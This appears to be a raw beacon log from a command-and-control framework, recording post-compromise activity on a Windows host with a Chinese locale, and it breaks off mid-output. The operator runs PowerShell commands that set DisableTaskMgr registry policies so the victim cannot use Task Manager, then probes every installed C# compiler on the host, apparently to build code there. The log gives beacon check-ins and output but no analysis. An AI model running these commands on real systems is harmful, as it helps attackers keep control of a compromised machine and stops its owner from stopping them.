03/02 10:32:45 [task] Tasked beacon to run: remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr
03/02 10:32:45 [task] Tasked beacon to run: new-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr -propertyType Dword -Value 0x00000001
03/02 10:32:45 [task] Tasked beacon to run: remove-ItemProperty -Path HKCU:\Software\MicrosoftWindows\CurrentVersion\Policies\System -Name DisableTaskMgr
03/02 10:32:45 [task] Tasked beacon to run: new-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr -propertyType Dword -Value 0x00000001
03/02 10:32:45 [task] Tasked beacon to run: remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\GroupPolicyObjects\LocalUser\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr
03/02 10:32:45 [task] Tasked beacon to run: new-ItemProperty -Path HKCU:\SoftwareMicrosoft\Windows\CurrentVersion\GroupPolicyObjects\LocalUser\SoftwareMicrosoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr -propertyType Dword -Value 0x00000001
03/02 10:32:46 [checkin] host called home, sent: 2798 bytes
03/02 10:32:48 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Remove-ItemProperty : 路径 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Curren_x000D__x000A_</S><S S="Error">tVersion\Policies\System 处不存在属性 DisableTaskMgr。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ remove-ItemProperty &lt;&lt;&lt;&lt;  -Path HKLM:\Software\Microsoft\Windows\CurrentVersi_x000D__x000A_</S><S S="Error">on\Policies\System -Name DisableTaskMgr_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidArgument: (DisableTaskMgr:String) [Remove _x000D__x000A_</S><S S="Error">   -ItemProperty], PSArgumentException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : System.Management.Automation.PSArgumentException _x000D__x000A_</S><S S="Error">   ,Microsoft.PowerShell.Commands.RemoveItemPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

03/02 10:32:48 [output]
received output:


PSPath         : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Softwar
                 e\Microsoft\Windows\CurrentVersion\Policies\System
PSParentPath   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Softwar
                 e\Microsoft\Windows\CurrentVersion\Policies
PSChildName    : System
PSDrive        : HKLM
PSProvider     : Microsoft.PowerShell.Core\Registry
DisableTaskMgr : 1





03/02 10:32:48 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Remove-ItemProperty : 找不到路径“HKCU:\Software\MicrosoftWindows\CurrentVersio_x000D__x000A_</S><S S="Error">n\Policies\System”，因为该路径不存在。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ remove-ItemProperty &lt;&lt;&lt;&lt;  -Path HKCU:\Software\MicrosoftWindows\CurrentVersio_x000D__x000A_</S><S S="Error">n\Policies\System -Name DisableTaskMgr_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (HKCU:\Software\...Policies\Syst _x000D__x000A_</S><S S="Error">   em:String) [Remove-ItemProperty], ItemNotFoundException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.Remov _x000D__x000A_</S><S S="Error">   eItemPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

03/02 10:32:48 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">New-ItemProperty : 找不到路径“HKCU:\Software\Microsoft\Windows\CurrentVersion\_x000D__x000A_</S><S S="Error">Policies\System”，因为该路径不存在。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 17_x000D__x000A_</S><S S="Error">+ new-ItemProperty &lt;&lt;&lt;&lt;  -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\_x000D__x000A_</S><S S="Error">Policies\System -Name DisableTaskMgr -propertyType Dword -Value 0x00000001_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (HKCU:\Software\...Policies\Syst _x000D__x000A_</S><S S="Error">   em:String) [New-ItemProperty], ItemNotFoundException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewIt _x000D__x000A_</S><S S="Error">   emPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

03/02 10:32:48 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Remove-ItemProperty : 找不到路径“HKCU:\Software\Microsoft\Windows\CurrentVersi_x000D__x000A_</S><S S="Error">on\GroupPolicyObjects\LocalUser\Software\Microsoft\Windows\CurrentVersion\Polic_x000D__x000A_</S><S S="Error">ies\System”，因为该路径不存在。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ remove-ItemProperty &lt;&lt;&lt;&lt;  -Path HKCU:\Software\Microsoft\Windows\CurrentVersi_x000D__x000A_</S><S S="Error">on\GroupPolicyObjects\LocalUser\Software\Microsoft\Windows\CurrentVersion\Polic_x000D__x000A_</S><S S="Error">ies\System -Name DisableTaskMgr_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (HKCU:\Software\...Policies\Syst _x000D__x000A_</S><S S="Error">   em:String) [Remove-ItemProperty], ItemNotFoundException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.Remov _x000D__x000A_</S><S S="Error">   eItemPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

03/02 10:32:48 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">New-ItemProperty : 找不到路径“HKCU:\SoftwareMicrosoft\Windows\CurrentVersion\G_x000D__x000A_</S><S S="Error">roupPolicyObjects\LocalUser\SoftwareMicrosoft\Windows\CurrentVersion\Policies\S_x000D__x000A_</S><S S="Error">ystem”，因为该路径不存在。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 17_x000D__x000A_</S><S S="Error">+ new-ItemProperty &lt;&lt;&lt;&lt;  -Path HKCU:\SoftwareMicrosoft\Windows\CurrentVersion\G_x000D__x000A_</S><S S="Error">roupPolicyObjects\LocalUser\SoftwareMicrosoft\Windows\CurrentVersion\Policies\S_x000D__x000A_</S><S S="Error">ystem -Name DisableTaskMgr -propertyType Dword -Value 0x00000001_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (HKCU:\SoftwareM...Policies\Syst _x000D__x000A_</S><S S="Error">   em:String) [New-ItemProperty], ItemNotFoundException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewIt _x000D__x000A_</S><S S="Error">   emPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

03/02 10:38:45 [task] Tasked beacon to run: remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr
03/02 10:38:45 [task] Tasked beacon to run: remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr
03/02 10:38:45 [task] Tasked beacon to run: remove-ItemProperty -Path HKCU:\Software\MicrosoftWindows\CurrentVersion\GroupPolicyObjects\LocalUser\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr
03/02 10:38:48 [checkin] host called home, sent: 1261 bytes
03/02 10:38:49 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Remove-ItemProperty : 找不到路径“HKCU:\Software\Microsoft\Windows\CurrentVersi_x000D__x000A_</S><S S="Error">on\Policies\System”，因为该路径不存在。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ remove-ItemProperty &lt;&lt;&lt;&lt;  -Path HKCU:\Software\Microsoft\Windows\CurrentVersi_x000D__x000A_</S><S S="Error">on\Policies\System -Name DisableTaskMgr_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (HKCU:\Software\...Policies\Syst _x000D__x000A_</S><S S="Error">   em:String) [Remove-ItemProperty], ItemNotFoundException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.Remov _x000D__x000A_</S><S S="Error">   eItemPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

03/02 10:38:49 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Remove-ItemProperty : 找不到路径“HKCU:\Software\MicrosoftWindows\CurrentVersio_x000D__x000A_</S><S S="Error">n\GroupPolicyObjects\LocalUser\Software\Microsoft\Windows\CurrentVersion\Polici_x000D__x000A_</S><S S="Error">es\System”，因为该路径不存在。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ remove-ItemProperty &lt;&lt;&lt;&lt;  -Path HKCU:\Software\MicrosoftWindows\CurrentVersio_x000D__x000A_</S><S S="Error">n\GroupPolicyObjects\LocalUser\Software\Microsoft\Windows\CurrentVersion\Polici_x000D__x000A_</S><S S="Error">es\System -Name DisableTaskMgr_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (HKCU:\Software\...Policies\Syst _x000D__x000A_</S><S S="Error">   em:String) [Remove-ItemProperty], ItemNotFoundException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.Remov _x000D__x000A_</S><S S="Error">   eItemPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

03/02 10:53:41 [task] Tasked beacon to run: C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe -help
03/02 10:53:41 [task] Tasked beacon to run: C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe -help
03/02 10:53:41 [task] Tasked beacon to run: C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -help
03/02 10:53:41 [task] Tasked beacon to run: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe -help
03/02 10:53:41 [task] Tasked beacon to run: C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe -help
03/02 10:53:41 [task] Tasked beacon to run: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -help
03/02 10:53:49 [checkin] host called home, sent: 1318 bytes
03/02 10:53:53 [output]
received output:
Microsoft (R) Visual C# 2005 编译器 版本 8.00.50727.4927
用于 Microsoft (R) Windows (R) 2005 Framework 版本 2.0.50727
版权所有(C) Microsoft Corporation 2001-2005。保留所有权利。

                      Visual C# 2005 编译器选项

                        - 输出文件 -
/out:<file>                   指定输出文件名(默认值: 包含主类的文件或第一个文件的基名称)
/target:exe                   生成控制台可执行文件(默认) (缩写: /t:exe)
/target:winexe                生成 Windows 可执行文件 (缩写: /t:winexe)
/target:library               生成库 (缩写: /t:library)
/target:module                生成能添加到其他程序集的模块 (缩写: /t:module)
/delaysign[+|-]               仅使用强名称密钥的公共部分对程序集进行延迟签名
/doc:<file>                   要生成的 XML 文档文件
/keyfile:<file>               指定强名称密钥文件
/keycontainer:<string>        指定强名称密钥容器
/platform:<string>            限制可以在其上运行此代码的平台: x86、Itanium、x64 或 anycpu。默认值为 anycpu。

                        - 输入文件 -
/recurse:<wildcard>           根据通配符规范，包括当前目录和子目录下的所有文件
/reference:<alias>=<file>     使用给定的别名从指定的程序集文件引用元数据 (缩写: /r)
/reference:<file list>        从指定的程序集文件引用元数据 (缩写: /r)
/addmodule:<file list>        将指定的模块链接到此程序集中

                        - 资源 -
/win32res:<file>              指定 Win32 资源文件(.res)
/win32icon:<file>             使用该图标输出
/resource:<resinfo>           嵌入指定的资源 (缩写: /res)
/linkresource:<resinfo>       将指定的资源链接到此程序集 (缩写: /linkres)
                              其中 resinfo 的格式是 <file>[,<string name>[,public|private]]

                        - 代码生成 -
/debug[+|-]                   发出调试信息
/debug:{full|pdbonly}         指定调试类型(“full”是默认类型，可以将调试程序附加到正在运行的程序)
/optimize[+|-]                启用优化 (缩写: /o)

                        - 错误和警告 -
/warnaserror[+|-]             将所有警告报告为错误
/warnaserror[+|-]:<warn list> 将特定警告报告为错误
/warn:<n>                     设置警告等级(0-4) (缩写: /w)
/nowarn:<warn list>           禁用特定的警告消息

                        - 语言 -
/checked[+|-]                 生成溢出检查
/unsafe[+|-]                  允许“不安全”代码
/define:<symbol list>         定义条件编译符号 (缩写: /d)
/langversion:<string>         指定语言版本模式: ISO-1 或 Default

                        - 杂项 -
@<file>                       有关更多选项，请阅读响应文件
/help                         显示此用法信息 (缩写: /?)
/nologo                       取消编译器版权信息
/noconfig                     不要自动包含 CSC.RSP 文件

                        - 高级 -
/baseaddress:<address>        要生成的库的基址
/bugreport:<file>             创建“Bug 报告”文件。
/codepage:<n>                 指定打开源文件时要使用的代码页
/utf8output                   以 UTF-8 编码格式输出编译器消息
/main:<type>                  指定包含入口点的类型(忽略所有其他可能的入口点) (缩写: /m)
/fullpaths                    编译器生成完全限定路径
/filealign:<n>                指定用于输出文件节的对齐方式
/pdb:<file>                   指定调试信息文件名(默认值: 扩展名为 .pdb 的输出文件名)
/nostdlib[+|-]                不引用标准库(mscorlib.dll)
/lib:<file list>              指定要在其中搜索引用的附加目录
/errorreport:<string>         指定如何处理内部编译器错误: prompt、send、queue 或 none。默认值为 queue。
/moduleassemblyname:<string>  此模块所属程序集的名称。



03/02 10:53:53 [output]
received output:
适用于 Microsoft(R) .NET Framework 3.5 版的 Microsoft(R) Visual C# 2008 编译器 3.5.30729.5420
 版
版权所有(C) Microsoft Corporation。保留所有权利。

                        Visual C# 2008 编译器选项

                        - 输出文件 -
/out:<文件>                    指定输出文件名(默认值: 包含主类的文件或第一个文件的基名称)
/target:exe                    生成控制台可执行文件(默认) (缩写: /t:exe)
/target:winexe                 生成 Windows 可执行文件 (缩写: /t:winexe)
/target:library                生成库 (缩写: /t:library)
/target:module                 生成能添加到其他程序集的模块 (缩写: /t:module)
/delaysign[+|-]                仅使用强名称密钥的公共部分对程序集进行延迟签名
/doc:<文件>                    要生成的 XML 文档文件
/keyfile:<文件>                指定强名称密钥文件
/keycontainer:<字符串>         指定强名称密钥容器
/platform:<字符串>             限制可以在其上运行此代码的平台: x86、Itanium、x64 或 anycpu。默认值为 anycpu。

                        - 输入文件 -
/recurse:<通配符>              根据通配符规范，包括当前目录和子目录下的所有文件
/reference:<别名>=<文件>       使用给定的别名从指定的程序集文件引用元数据 (缩写: /r)
/reference:<文件列表>          从指定的程序集文件引用元数据 (缩写: /r)
/addmodule:<文件列表>          将指定的模块链接到此程序集中

                        - 资源 -
/win32res:<文件>               指定 Win32 资源文件(.res)
/win32icon:<文件>              对输出使用此图标
/win32manifest:<文件>          指定 Win32 清单文件(.xml)
/nowin32manifest               不包括默认 Win32 清单
/resource:<资源信息>           嵌入指定的资源 (缩写: /res)
/linkresource:<资源信息>       将指定的资源链接到此程序集 (缩写: /linkres)
                               其中 resinfo 的格式是 <file>[,<string name>[,public|private]]

                        - 代码生成 -
/debug[+|-]                    发出调试信息
/debug:{full|pdbonly}          指定调试类型(“full”是默认类型，可以将调试程序附加到正在运行的程序)
/optimize[+|-]                 启用优化 (缩写: /o)

                        - 错误和警告 -
/warnaserror[+|-]              将所有警告报告为错误
/warnaserror[+|-]:<警告列表>   将特定警告报告为错误
/warn:<n>                      设置警告等级(0-4) (缩写: /w)
/nowarn:<警告列表>             禁用特定的警告消息

                        - 语言 -
/checked[+|-]                  生成溢出检查
/unsafe[+|-]                   允许“不安全”代码
/define:<符号列表>             定义条件编译符号 (缩写: /d)
/langversion:<字符串>          指定语言版本模式: ISO-1、ISO-2 或 Default

                        - 杂项 -
@<文件>                        有关更多选项，请阅读响应文件
/help                          显示此用法信息 (缩写: /?)
/nologo                        取消编译器版权信息
/noconfig                      不要自动包含 CSC.RSP 文件

                        - 高级 -
/baseaddress:<地址>            要生成的库的基址
/bugreport:<文件>              创建“Bug 报告”文件
/codepage:<n>                  指定打开源文件时要使用的代码页
/utf8output                    以 UTF-8 编码格式输出编译器消息
/main:<类型>                   指定包含入口点的类型(忽略所有其他可能的入口点) (缩写: /m)
/fullpaths                     编译器生成完全限定路径
/filealign:<n>                 指定用于输出文件节的对齐方式
/pdb:<文件>                    指定调试信息文件名(默认值: 扩展名为 .pdb 的输出文件名)
/nostdlib[+|-]                 不引用标准库(mscorlib.dll)
/lib:<文件列表>                指定要在其中搜索引用的附加目录
/errorreport:<字符串>          指定如何处理内部编译器错误: prompt、send、queue 或 none。默认值为 queue。
/moduleassemblyname:<字符串>   此模块所属程序集的名称



03/02 10:53:53 [output]
received output:
Microsoft (R) Visual C# Compiler version 4.6.1055.0
for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240

                        Visual C# 编译器选项

                        - 输出文件 -
/out:<文件>                    指定输出文件名(默认值: 包含主类的文件或第一个文件的基名称)
/target:exe                    生成控制台可执行文件(默认) (缩写: /t:exe)
/target:winexe                 生成 Windows 可执行文件 (缩写: /t:winexe)
/target:library                生成库 (缩写: /t:library)
/target:module                 生成能添加到其他程序集的模块 (缩写: /t:module)
/target:appcontainerexe        生成 Appcontainer 可执行文件 (缩写: /t:appcontainerexe)
/target:winmdobj               生成 WinMDExp 使用的 Windows 运行时中间文件 (缩写: /t:winmdobj)
/doc:<文件>                    要生成的 XML 文档文件
/platform:<字符串>             限制可以在其上运行此代码的平台: x86、Itanium、x64、arm、anycpu32bitpreferred 或 anycpu。默认值为 anycpu。

                        - 输入文件 -
/recurse:<通配符>              根据通配符规范，包括当前目录和子目录下的所有文件
/reference:<别名>=<文件>       使用给定的别名从指定的程序集文件引用元数据 (缩写: /r)
/reference:<文件列表>          从指定的程序集文件引用元数据 (缩写: /r)
/addmodule:<文件列表>          将指定的模块链接到此程序集中
/link:<文件列表>               嵌入指定的互操作程序集文件中的元数据 (缩写: /l)

                        - 资源 -
/win32res:<文件>               指定 Win32 资源文件(.res)
/win32icon:<文件>              对输出使用此图标
/win32manifest:<文件>          指定 Win32 清单文件(.xml)
/nowin32manifest               不包括默认 Win32 清单
/resource:<资源信息>           嵌入指定的资源 (缩写: /res)
/linkresource:<资源信息>       将指定的资源链接到此程序集 (缩写: /linkres)
                               其中 resinfo 的格式是 <file>[,<string name>[,public|private]]

                        - 代码生成 -
/debug[+|-]                    发出调试信息
/debug:{full|pdbonly}          指定调试类型(“full”是默认类型，可以将调试程序附加到正在运行的程序)
/optimize[+|-]                 启用优化 (缩写: /o)

                        - 错误和警告 -
/warnaserror[+|-]              将所有警告报告为错误
/warnaserror[+|-]:<警告列表>   将特定警告报告为错误
/warn:<n>                      设置警告等级(0-4) (缩写: /w)
/nowarn:<警告列表>             禁用特定的警告消息

                        - 语言 -
/checked[+|-]                  生成溢出检查
/unsafe[+|-]                   允许“不安全”代码
/define:<符号列表>             定义条件编译符号 (缩写: /d)
/langversion:<字符串>          指定语言版本模式: ISO-1、ISO-2、3、4、5 或 Default

                        - 安全性 -
/delaysign[+|-]                仅使用强名称密钥的公共部分对程序集进行延迟签名
/keyfile:<文件>                指定强名称密钥文件
/keycontainer:<字符串>         指定强名称密钥容器
/highentropyva[+|-]            启用高平均信息量的 ASLR

                        - 杂项 -
@<文件>                        有关更多选项，请阅读响应文件
/help                          显示此用法信息 (缩写: /?)
/nologo                        取消编译器版权信息
/noconfig                      不要自动包含 CSC.RSP 文件

                        - 高级 -
/baseaddress:<地址>            要生成的库的基址
/bugreport:<文件>              创建“Bug 报告”文件
/codepage:<n>                  指定打开源文件时要使用的代码页
/utf8output                    以 UTF-8 编码格式输出编译器消息
/main:<类型>                   指定包含入口点的类型(忽略所有其他可能的入口点) (缩写: /m)
/fullpaths                     编译器生成完全限定路径
/filealign:<n>                 指定用于输出文件节的对齐方式
/pdb:<文件>                    指定调试信息文件名(默认值: 扩展名为 .pdb 的输出文件名)
/errorendlocation              输出每个错误的结束位置的行和列
/preferreduilang               指定首选输出语言名称。
/nostdlib[+|-]                 不引用标准库(mscorlib.dll)
/subsystemversion:<字符串>     指定此程序集的子系统版本
/lib:<文件列表>                指定要在其中搜索引用的附加目录
/errorreport:<字符串>          指定如何处理内部编译器错误: prompt、send、queue 或 none。默认值为 queue。
/appconfig:<文件>              指定一个包含程序集绑定设置的应用程序配置文件
/moduleassemblyname:<字符串>   此模块所属程序集的名称



03/02 10:53:53 [output]
received output:
Microsoft (R) Visual C# 2005 编译器 版本 8.00.50727.4927
用于 Microsoft (R) Windows (R) 2005 Framework 版本 2.0.50727
版权所有(C) Microsoft Corporation 2001-2005。保留所有权利。

                      Visual C# 2005 编译器选项

                        - 输出文件 -
/out:<file>                   指定输出文件名(默认值: 包含主类的文件或第一个文件的基名称)
/target:exe                   生成控制台可执行文件(默认) (缩写: /t:exe)
/target:winexe                生成 Windows 可执行文件 (缩写: /t:winexe)
/target:library               生成库 (缩写: /t:library)
/target:module                生成能添加到其他程序集的模块 (缩写: /t:module)
/delaysign[+|-]               仅使用强名称密钥的公共部分对程序集进行延迟签名
/doc:<file>                   要生成的 XML 文档文件
/keyfile:<file>               指定强名称密钥文件
/keycontainer:<string>        指定强名称密钥容器
/platform:<string>            限制可以在其上运行此代码的平台: x86、Itanium、x64 或 anycpu。默认值为 anycpu。

                        - 输入文件 -
/recurse:<wildcard>           根据通配符规范，包括当前目录和子目录下的所有文件
/reference:<alias>=<file>     使用给定的别名从指定的程序集文件引用元数据 (缩写: /r)
/reference:<file list>        从指定的程序集文件引用元数据 (缩写: /r)
/addmodule:<file list>        将指定的模块链接到此程序集中

                        - 资源 -
/win32res:<file>              指定 Win32 资源文件(.res)
/win32icon:<file>             使用该图标输出
/resource:<resinfo>           嵌入指定的资源 (缩写: /res)
/linkresource:<resinfo>       将指定的资源链接到此程序集 (缩写: /linkres)
                              其中 resinfo 的格式是 <file>[,<string name>[,public|private]]

                        - 代码生成 -
/debug[+|-]                   发出调试信息
/debug:{full|pdbonly}         指定调试类型(“full”是默认类型，可以将调试程序附加到正在运行的程序)
/optimize[+|-]                启用优化 (缩写: /o)

                        - 错误和警告 -
/warnaserror[+|-]             将所有警告报告为错误
/warnaserror[+|-]:<warn list> 将特定警告报告为错误
/warn:<n>                     设置警告等级(0-4) (缩写: /w)
/nowarn:<warn list>           禁用特定的警告消息

                        - 语言 -
/checked[+|-]                 生成溢出检查
/unsafe[+|-]                  允许“不安全”代码
/define:<symbol list>         定义条件编译符号 (缩写: /d)
/langversion:<string>         指定语言版本模式: ISO-1 或 Default

                        - 杂项 -
@<file>                       有关更多选项，请阅读响应文件
/help                         显示此用法信息 (缩写: /?)
/nologo                       取消编译器版权信息
/noconfig                     不要自动包含 CSC.RSP 文件

                        - 高级 -
/baseaddress:<address>        要生成的库的基址
/bugreport:<file>             创建“Bug 报告”文件。
/codepage:<n>                 指定打开源文件时要使用的代码页
/utf8output                   以 UTF-8 编码格式输出编译器消息
/main:<type>                  指定包含入口点的类型(忽略所有其他可能的入口点) (缩写: /m)
/fullpaths                    编译器生成完全限定路径
/filealign:<n>                指定用于输出文件节的对齐方式
/pdb:<file>                   指定调试信息文件名(默认值: 扩展名为 .pdb 的输出文件名)
/nostdlib[+|-]                不引用标准库(mscorlib.dll)
/lib:<file list>              指定要在其中搜索引用的附加目录
/errorreport:<string>         指定如何处理内部编译器错误: prompt、send、queue 或 none。默认值为 queue。
/moduleassemblyname:<string>  此模块所属程序集的名称。



03/02 10:53:53 [output]
received output:
适用于 Microsoft(R) .NET Framework 3.5 版的 Microsoft(R) Visual C# 2008 编译器 3.5.30729.5420
 版
版权所有(C) Microsoft Corporation。保留所有权利。

                        Visual C# 2008 编译器选项

                        - 输出文件 -
/out:<文件>                    指定输出文件名(默认值: 包含主类的文件或第一个文件的基名称)
/target:exe                    生成控制台可执行文件(默认) (缩写: /t:exe)
/target:winexe                 生成 Windows 可执行文件 (缩写: /t:winexe)
/target:library                生成库 (缩写: /t:library)
/target:module                 生成能添加到其他程序集的模块 (缩写: /t:module)
/delaysign[+|-]                仅使用强名称密钥的公共部分对程序集进行延迟签名
/doc:<文件>                    要生成的 XML 文档文件
/keyfile:<文件>                指定强名称密钥文件
/keycontainer:<字符串>         指定强名称密钥容器
/platform:<字符串>             限制可以在其上运行此代码的平台: x86、Itanium、x64 或 anycpu。默认值为 anycpu。

                        - 输入文件 -
/recurse:<通配符>              根据通配符规范，包括当前目录和子目录下的所有文件
/reference:<别名>=<文件>       使用给定的别名从指定的程序集文件引用元数据 (缩写: /r)
/reference:<文件列表>          从指定的程序集文件引用元数据 (缩写: /r)
/addmodule:<文件列表>          将指定的模块链接到此程序集中

                        - 资源 -
/win32res:<文件>               指定 Win32 资源文件(.res)
/win32icon:<文件>              对输出使用此图标
/win32manifest:<文件>          指定 Win32 清单文件(.xml)
/nowin32manifest               不包括默认 Win32 清单
/resource:<资源信息>           嵌入指定的资源 (缩写: /res)
/linkresource:<资源信息>       将指定的资源链接到此程序集 (缩写: /linkres)
                               其中 resinfo 的格式是 <file>[,<string name>[,public|private]]

                        - 代码生成 -
/debug[+|-]                    发出调试信息
/debug:{full|pdbonly}          指定调试类型(“full”是默认类型，可以将调试程序附加到正在运行的程序)
/optimize[+|-]                 启用优化 (缩写: /o)

                        - 错误和警告 -
/warnaserror[+|-]              将所有警告报告为错误
/warnaserror[+|-]:<警告列表>   将特定警告报告为错误
/warn:<n>                      设置警告等级(0-4) (缩写: /w)
/nowarn:<警告列表>             禁用特定的警告消息

                        - 语言 -
/checked[+|-]                  生成溢出检查
/unsafe[+|-]                   允许“不安全”代码
/define:<符号列表>             定义条件编译符号 (缩写: /d)
/langversion:<字符串>          指定语言版本模式: ISO-1、ISO-2 或 Default

                        - 杂项 -
@<文件>                        有关更多选项，请阅读响应文件
/help                          显示此用法信息 (缩写: /?)
/nologo                        取消编译器版权信息
/noconfig                      不要自动包含 CSC.RSP 文件

                        - 高级 -
/baseaddress:<地址>            要生成的库的基址
/bugreport:<文件>              创建“Bug 报告”文件
/codepage:<n>                  指定打开源文件时要使用的代码页
/utf8output                    以 UTF-8 编码格式输出编译器消息
/main:<类型>                   指定包含入口点的类型(忽略所有其他可能的入口点) (缩写: /m)
/fullpaths                     编译器生成完全限定路径
/filealign:<n>                 指定用于输出文件节的对齐方式
/pdb:<文件>                    指定调试信息文件名(默认值: 扩展名为 .pdb 的输出文件名)
/nostdlib[+|-]                 不引用标准库(mscorlib.dll)
/lib:<文件列表>                指定要在其中搜索引用的附加目录
/errorreport:<字符串>          指定如何处理内部编译器错误: prompt、send、queue 或 none。默认值为 queue。
/moduleassemblyname:<字符串>   此模块所属程序集的名称



03/02 10:53:53 [output]
received output:
Microsoft (R) Visual C# Compiler version 4.6.1055.0
for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240

                        Visual C# 编译器选项

                        - 输出文件 -
/out:<文件>                    指定输出文件名(默认值: 包含主类的文件或第一个文件的基名称)
/target:exe                    生成控制台可执行文件(默认) (缩写: /t:exe)
/target:winexe                 生成 Windows 可执行文件 (缩写: /t:winexe)
/target:library                生成库 (缩写: /t:library)
/target:module                 生成能添加到其他程序集的模块 (缩写: /t:module)
/target:appcontainerexe        生成 Appcontainer 可执行文件 (缩写: /t:appcontainerexe)
/target:winmdobj               生成 WinMDExp 使用的 Windows 运行时中间文件 (缩写: /t:winmdobj)
/doc:<文件>                    要生成的 XML 文档文件
/platform:<字符串>             限制可以在其上运行此代码的平台: x86、Itanium、x64、arm、anycpu32bitpreferred 或 anycpu。默认值为 anycpu。

                        - 输入文件 -
/recurse:<通配符>              根据通配符规范，包括当前目录和子目录下的所有文件
/reference:<别名>=<文件>       使用给定的别名从指定的程序集文件引用元数据 (缩写: /r)
/reference:<文件列表>          从指定的程序集文件引用元数据 (缩写: /r)
/addmodule:<文件列表>          将指定的模块链接到此程序集中
/link:<文件列表>               嵌入指定的互操作程序集文件中的元数据 (缩写: /l)

                        - 资源 -
/win32res:<文件>               指定 Win32 资源文件(.res)
/win32icon:<文件>              对输出使用此图标
/win32manifest:<文件>          指定 Win32 清单文件(.xml)
/nowin32manifest               不包括默认 Win32 清单
/resource:<资源信息>           嵌入指定的资源 (缩写: /res)
/linkresource:<资源信息>       将指定的资源链接到此程序集 (缩写: /linkres)
                               其中 resinfo 的格式是 <file>[,<string name>[,public|private]]

                        - 代码生成 -
/debug[+|-]                    发出调试信息
/debug:{full|pdbonly}          指定调试类型(“full”是默认类型，可以将调试程序附加到正在运行的程序)
/optimize[+|-]                 启用优化 (缩写: /o)

                        - 错误和警告 -
/warnaserror[+|-]              将所有警告报告为错误
